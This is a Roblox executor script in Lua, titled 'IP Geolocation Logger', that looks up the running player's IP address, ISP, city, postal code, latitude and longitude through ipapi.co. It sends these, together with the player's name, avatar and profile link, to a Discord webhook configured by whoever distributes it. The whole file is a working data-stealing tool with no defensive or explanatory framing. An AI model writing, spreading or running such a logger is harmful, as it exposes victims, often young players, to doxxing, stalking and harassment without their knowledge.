-- Credits to @mcantcode on Discord.
local webhookUrl = tostring(getgenv().WebhookURL)
if not webhookUrl:match("^https://(discord%.com|ptb%.discord%.com)/api/webhooks/%d+/[%w%-%_]+$") then
	return
end

local httpService = game:GetService("HttpService")
local player = game:GetService("Players").LocalPlayer
while not player do
	task.wait()
end

local avatarSuccess, avatarUrl = pcall(function()
	return httpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. player.UserId .. "&size=720x720&format=Png&isCircular=false")).data[1].imageUrl
end)

local geoSuccess, geoData = pcall(function()
	return httpService:JSONDecode(game:HttpGet("https://ipapi.co/json/"))
end)
if not geoSuccess then
	geoData = {}
end

local function addField(name, value)
	return { name = name, value = tostring(geoData[value]) }
end

pcall(function()
	(request or http_request or (http and http.request))({
		Url = webhookUrl,
		Method = "POST",
		Body = httpService:JSONEncode({
			embeds = {
				{
					title = "Geolocation",
					color = 1733608,
					fields = {
						addField("IP Address", "ip"),
						addField("Network Range", "network"),
						addField("ASN (Autonomous System Number)", "asn"),
						addField("ISP (Internet Service Provider)", "org"),
						addField("Country", "country_name"),
						addField("Region/Province", "region"),
						addField("City", "city"),
						addField("Postal Code", "postal"),
						addField("Latitude", "latitude"),
						addField("Longitude", "longitude"),
						addField("Timezone", "timezone")
					}
				},
				{
					title = "View " .. player.Name .. "'s full profile",
					url = "https://www.roblox.com/users/" .. player.UserId .. "/profile",
					color = 1733608,
					image = { url = avatarSuccess and avatarUrl or "https://i.ibb.co/tPYH7jS6/No-Image-Available.jpg" }
				}
			},
			username = "IP Geolocation Logger",
			avatar_url = "https://i.ibb.co/spwWKyBW/Globe-With-Meridians.png"
		}),
		Headers = { ["Content-Type"] = "application/json" }
	})
end)
